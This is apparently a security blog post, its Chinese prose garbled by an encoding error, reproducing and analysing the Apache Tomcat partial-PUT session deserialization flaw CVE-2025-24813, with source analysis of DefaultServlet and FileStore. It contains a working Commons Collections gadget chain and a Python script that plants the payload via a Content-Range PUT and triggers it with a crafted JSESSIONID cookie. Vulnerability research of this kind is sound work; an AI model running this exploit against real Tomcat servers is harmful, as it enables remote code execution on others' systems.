+++
date = '2025-03-12T18:00:00+08:00'
draft = false
title = [Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ'
author='GSBP'
categories=["Javaå®‰å…¨","CVE"]

+++

## å‰è¨€

å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹

## é€šæŠ¥

å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹

![image-20250312143659450](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png)

ä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥

### ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹

- ReadOnlyä¸ºfalse
- æ”¯æŒpartial PUTæ–¹æ³•

- æ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°
-  å®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰

### ååºåˆ—åŒ–RCE

- ReadOnlyä¸ºfalse
- æ”¯æŒpartial PUTæ–¹æ³•
- æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½®
- æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ–

## ç¯å¢ƒæ­å»º

æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ

https://juejin.cn/post/7331544684290228250

æ¥ä¸‹æ¥ä¿®æ”¹readonly

`tomcatç›®å½•/conf/web.xml`

```
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
      <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
      </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
```

å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼

`tomcatç›®å½•/conf/context.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<!-- The contents of this file will be loaded for each web application -->
<Context>

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>WEB-INF/tomcat-web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
  <Manager className="org.apache.catalina.session.PersistentManager"
           debug="0"
           saveOnRestart="false"
           maxActiveSession="-1"
           minIdleSwap="-1"
           maxIdleSwap="-1"
           maxIdleBackup="-1">
    <Store className="org.apache.catalina.session.FileStore" directory=""/>
  </Manager>
</Context>
```

å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–

```
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
```

## æ¼æ´å¤ç°

å¼€å¯æœåŠ¡

![image-20250312145524530](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145524530.png)

ç„¶åè·‘ä¸ªccçš„poc

```
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.util.*;
import java.lang.reflect.*;

public class Main {

    public static void main(String[] args) throws Exception {
        String cmd="open -a calculator";
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        HashMap hsmap=new HashMap();
        hsmap.put("value","test");

        Map transformedMap=TransformedMap.decorate(hsmap,null,chainedTransformer);

        Class aclass=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=aclass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class,transformedMap);

        FileOutputStream bao=new FileOutputStream("ser");
        ObjectOutputStream oos=new ObjectOutputStream(bao);
        oos.writeObject(handler);
        oos.close();

    }

}
```

å¾—åˆ°seræ–‡ä»¶ä¹‹åå†è·‘ä¸‹é¢è„šæœ¬

```
import requests
data=open("ser","rb").read()
headers={"Content-Range":"bytes 0-10000/67589"}
url="http://127.0.0.1:8081/evil/session"
requests.put(url,headers=headers,data=data)
requests.get(url,headers={"Cookie":"JSESSIONID=.evil"})
```

![image-20250312145744884](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145744884.png)

## åŸç†åˆ†æ

### å…¶ä¸€

æ¼æ´ç‚¹åœ¨`DefaultServlet`ä¸‹çš„doPutæ–¹æ³•ä¸­è°ƒç”¨` executePartialPut`æ–¹æ³•

![image-20250312150329188](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312150329188.png)

åœ¨` executePartialPut`æ–¹æ³•ä¸­,æ ¹æ®ä¼ å…¥çš„pathï¼Œrequeståˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œä¿å­˜åœ°å€ä¸ºå½“å‰ServletContextä¸‹çš„ä¸´æ—¶æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸”å°†pathä¸­çš„`/`è½¬åŒ–ä¸ºäº†`.`

```
protected File executePartialPut(HttpServletRequest req, Range range, String path) throws IOException {

    // Append data specified in ranges to existing content for this
    // resource - create a temp. file on the local filesystem to
    // perform this operation
    File tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);
    // Convert all '/' characters to '.' in resourcePath
    String convertedResourcePath = path.replace('/', '.');
    File contentFile = new File(tempDir, convertedResourcePath);
    if (contentFile.createNewFile()) {
        // Clean up contentFile when Tomcat is terminated
        contentFile.deleteOnExit();
    }

    try (RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, "rw")) {

        WebResource oldResource = resources.getResource(path);

        // Copy data in oldRevisionContent to contentFile
        if (oldResource.isFile()) {
            try (BufferedInputStream bufOldRevStream =
                    new BufferedInputStream(oldResource.getInputStream(), BUFFER_SIZE)) {

                int numBytesRead;
                byte[] copyBuffer = new byte[BUFFER_SIZE];
                while ((numBytesRead = bufOldRevStream.read(copyBuffer)) != -1) {
                    randAccessContentFile.write(copyBuffer, 0, numBytesRead);
                }

            }
        }

        randAccessContentFile.setLength(range.length);

        // Append data in request input stream to contentFile
        randAccessContentFile.seek(range.start);
        int numBytesRead;
        byte[] transferBuffer = new byte[BUFFER_SIZE];
        try (BufferedInputStream requestBufInStream = new BufferedInputStream(req.getInputStream(), BUFFER_SIZE)) {
            while ((numBytesRead = requestBufInStream.read(transferBuffer)) != -1) {
                randAccessContentFile.write(transferBuffer, 0, numBytesRead);
            }
        }
    }

    return contentFile;
}
```

åœ¨è°ƒç”¨`executePartialPut`ä¹‹å‰æœ‰ä¸ªè¦æ±‚ï¼Œéœ€è¦æˆ‘ä»¬çš„rangeä¸ä¸ºç©ºæˆ–`IGNORE`,å…¶å®å°±æ˜¯éœ€è¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåˆæ³•çš„`Content-Range`è¯·æ±‚å¤´ä¾¿å¯ä»¥æˆåŠŸåˆ›å»º

![image-20250312151011961](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151011961.png)

```
    protected Range parseContentRange(HttpServletRequest request, HttpServletResponse response) throws IOException {

        // Retrieving the content-range header (if any is specified
        String contentRangeHeader = request.getHeader("Content-Range");

        if (contentRangeHeader == null) {
            return IGNORE;
        }

        if (!allowPartialPut) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        ContentRange contentRange = ContentRange.parse(new StringReader(contentRangeHeader));

        if (contentRange == null) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }


        // bytes is the only range unit supported
        if (!contentRange.getUnits().equals("bytes")) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        // TODO: Remove the internal representation and use Ranges
        // Convert to internal representation
        Range range = new Range();
        range.start = contentRange.getStart();
        range.end = contentRange.getEnd();
        range.length = contentRange.getLength();

        if (!range.validate()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        return range;
    }
```

æˆ‘è¿™é‡ŒæˆåŠŸputä¹‹åï¼Œç¼“å­˜æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹ä½äº`apache-tomcat-9.0.85-src/work/Catalina/localhost/ROOT`ï¼Œ

![image-20250312151349915](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151349915.png)

![image-20250312151412366](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151412366.png)

### å…¶äºŒ

sessionæ–‡ä»¶çš„é»˜è®¤å­˜å‚¨ç‚¹æ­£å¥½ä½äºå½“å‰Contextçš„ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹

`FileStore.load`

![image-20250312181228233](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181228233.png)

ç”¨æˆ·åœ¨ä½¿ç”¨JSESSIONID=idçš„æƒ…å†µä¸‹è®¿é—®æœåŠ¡ï¼ŒFileStoreä¼šè‡ªåŠ¨çš„å»ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾åå­—ä¸º`id.session`çš„æ–‡ä»¶å¹¶ä¸”è¿›è¡Œååºåˆ—åŒ–æ“ä½œ![image-20250312181547867](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181547867.png)



æ‰€ä»¥æ”»å‡»æ€è·¯å°±ä¸²è”èµ·æ¥äº†

- æ”»å‡»è€…é€šè¿‡partialPutæ–¹æ³•å¾€æœåŠ¡ä¸´æ—¶æ–‡ä»¶å¤¹å¡å…¥å­˜æœ‰ååºåˆ—åŒ–æ•°æ®çš„æ–‡ä»¶
- æ”»å‡»è€…å†æ¬¡æ„é€ JSESSIONIDä¸º`.filename.session`çš„è¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ”»å‡»

### ä¿¡æ¯æ³„éœ²&ç¯¡æ”¹

è¿™é‡Œæˆ‘çœ‹äº†ä¸€ä¼šå„¿æ²¡æ€è€ƒå‡ºæ¥è¿™ä¸ªä¿¡æ¯æ³„æ¼çš„æ‰‹æ³•ï¼Œè®²è®²æˆ‘åœ¨æ€è€ƒè¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›å¯ç–‘ç‚¹å§(æ–¹å‘ä¸ä¿è¯å¯¹)

åœ¨æˆ‘ä»¬åˆ›å»ºäº†rangeçš„æƒ…å†µä¸‹ï¼Œä¸‹æ–¹è¿™ä¸ªifåˆ†æ”¯è¯­å¥ä¸‹æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œä¸¤ç«¯ä»£ç ï¼Œä¸€ä¸ªæ˜¯`PartialPut`æ–¹æ³•ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æ ¹æ®contentFileæ¥åˆ›å»ºä¸€ä¸ª

![image-20250312182108725](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182108725.png)

ä¸åŒäº`resourceInputStream = req.getInputStream();`çš„ç›´æ¥ä»reqä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥å†…å®¹ï¼Œè¿™é‡Œçš„æ˜¯æ ¹æ®æˆ‘ä»¬çš„è·¯å¾„å¯»æ‰¾å¯¹åº”æ–‡ä»¶ä¸‹çš„å†…å®¹

![image-20250312182456062](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182456062.png)

è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬putçš„è·¯å¾„ä¹Ÿå¹¶éæ˜¯éœ€è¦æ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå­˜åœ¨çš„æ–‡ä»¶æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰§è¡ŒpartialPutæ–¹æ³•ï¼Œæ–¹æ³•ä¼šæ ¹æ®æˆ‘ä»¬çš„`Content-Range`å¤´æ¥è®²æˆ‘ä»¬putçš„`body`å†…å®¹è¦†ç›–å¯¹åº”rangeçš„æ•°æ®ï¼Œè¿™é‡Œç®€å•å±•ç¤ºä¸€ä¸‹

è®¿é—®å·²å­˜åœ¨çš„123æ–‡ä»¶

![image-20250312182816636](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182816636.png)

put 123æ–‡ä»¶ å†…å®¹ä¸º66 rangeä¸ºContent-Range:bytes 200-1000/67589(rangeéšä¾¿è®¾çš„ï¼Œæˆ‘è¿™ä¸ªæ–‡ä»¶é•¿åº¦æ²¡è¿™ä¹ˆé•¿ï¼Œè¿™é‡Œæƒ…å†µæ˜¯è¦†ç›–æœ€ånä½ç­‰åŒäºæˆ‘ä»¬çš„putè¿›çš„å†…å®¹)

![image-20250312183103023](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183103023.png)

ç°åœ¨çœ‹ä¸€çœ¼123

![image-20250312183122544](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183122544.png)

æ‰€ä»¥è¯´partialPutæ–¹æ³•è¯»å–äº†ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹çš„å¯¹åº”æ–‡ä»¶å†…å®¹

éšå`resourceInputStream`è¿›å…¥äº†`resources.write`æ–¹æ³•,è¿™ä¸ªæ–¹æ³•ä¸‹æœ‰ä¸ªæ³¨é‡Šæœ‰ç‚¹æ€ª

![image-20250312183417739](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183417739.png)

è¿™ä¸ªcacheå¥½åƒæ˜¯ç”¨æ¥ç»™æ­£åœ¨ä¸Šä¼ çš„æ–‡ä»¶åŠ é”çš„ï¼Ÿæ²¡æœ‰è¢«removeçš„è¯æ— æ³•è¢«è®¿é—®çš„æ ·å­

è¿™é‡Œæœ‰è¿™ä¹ˆäº›æ–‡ä»¶åœ°å€

![image-20250312183517631](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183517631.png)

ä½†æ˜¯åé¢æˆ‘è‡ªå·±æµ‹è¯•ï¼Œå‘ç°å°±ç®—åœ¨è¿™ä¸ªcacheé‡Œå¥½åƒä¹Ÿèƒ½è®¿é—®ï¼Œä¸çŸ¥é“å•¥åŸå› äº†(æ™•)

é‚£æˆ‘å…¶å®å¯¹æ­¤å¤§è‡´çš„æ€è·¯å°±æœ‰ä¸¤ç§

1. é€šè¿‡æŸäº›æŠ¥é”™å°†resourceInputStreamçš„å†…å®¹å¸¦å‡ºæ¥ï¼Œé€ æˆæ³„æ¼
2. (æˆ‘çš„è¿™ä¸ªcacheç¯å¢ƒæœ‰é—®é¢˜çš„æƒ…å†µä¸‹QAQ)åœ¨cacheä¸­çš„æ–‡ä»¶è·¯å¾„æ— æ³•è®¿é—®ï¼Œä¸”æ•æ„Ÿæ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹çš„å­ç›®å½•(æ–‡ä»¶)ä¸­ï¼Œé€šè¿‡æˆ‘ä»¬æ¶æ„çš„å¾€å¯¹åº”è·¯å¾„æ„é€ putè¯·æ±‚ï¼Œå°†è¯¥æ•æ„Ÿæ–‡ä»¶ä»cacheä¸­removeæ‰ï¼Œä»è€Œèƒ½å¤Ÿè®¿é—®è¿™ä¸ªæ•æ„Ÿæ–‡ä»¶(ä¸è¿‡WEB-INFå’ŒMATA-INFè¿˜æ˜¯è®¿é—®ä¸åˆ°ï¼Œtomcatå·²ç»ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ä¸å‡†ä»¥è¿™ä¿©ç©æ„å¼€å¤´äº†)

## ç»“å°¾

åªå¤ç°å‡ºæ¥äº†RCEçš„æ´ï¼Œç®€å•æäº†ä¸€ä¸‹æˆ‘åœ¨ä¿¡æ¯æ³„éœ²è¿™æ–¹é¢çš„ä¸€äº›æ€è·¯ï¼Œå¦‚æœæ–‡ç« å†…å®¹æœ‰é”™è¯¯è¿˜è¯·å¸ˆå‚…è”ç³»æˆ‘çº æ­£ğŸ˜­~